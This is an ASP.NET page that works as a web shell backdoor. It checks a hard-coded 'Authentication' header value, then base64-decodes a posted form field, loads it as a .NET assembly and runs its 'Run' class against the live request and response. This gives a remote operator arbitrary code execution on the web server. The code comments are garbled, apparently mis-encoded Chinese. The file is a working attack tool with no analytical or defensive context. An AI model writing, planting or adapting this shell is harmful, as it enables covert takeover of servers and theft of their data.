<%@ Page Language="c#" %>
<%
    // �������ͷ���Ƿ����ָ������֤����
    string authenticationHeader = Request.Headers["Authentication"];
    if (authenticationHeader == "www.baidu.com")
    {
        // ��ȡ����������Ϊ "1" ������
        String Payload = Request.Form["1"];

        // ��� Payload �Ƿ�Ϊ null
        if (Payload != null)
        {
            // ���Լ���һ�����򼯣�������� Payload ����һ������Base64����ĳ��򼯵��ֽ�����
            System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));

            // ���������е�һ����Ϊ "Run" �����ʵ�������������ķ���
            assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(new object[] { Request, Response });
        }
    }
    else
    {
        // ��֤ʧ��ʱ�Ĵ���
        Response.StatusCode = 403; // Forbidden
        Response.Write("Authentication failed.");
        Response.End();
    }
%>
